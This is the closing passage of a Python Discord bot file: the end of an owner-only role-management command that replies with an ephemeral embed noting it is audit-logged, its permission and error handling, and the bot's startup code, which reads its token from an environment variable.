                value="This access is for debugging and helping server members with bot functionality.",
                inline=False
            )
            embed.add_field(
                name="Security Note",
                value="This command is restricted to the bot owner and creates an audit log entry for transparency.",
                inline=False
            )

            await interaction.response.send_message(embed=embed, ephemeral=True)

        except discord.Forbidden:
            await interaction.response.send_message(
                "❌ I don't have permission to manage roles in this server.",
                ephemeral=True
            )
        except Exception as e:
            await interaction.response.send_message(
                f"❌ An error occurred: {str(e)}",
                ephemeral=True
            )

# All task-related code moved to tasks.py module

# ============= BOT INITIALIZATION =============

if __name__ == "__main__":
    try:
        client = PuddlesBot()
        client.run(os.getenv('DISCORD_TOKEN'))
    except Exception as e:
        print(f"❌ Error starting bot: {e}")
        sys.exit(1) 
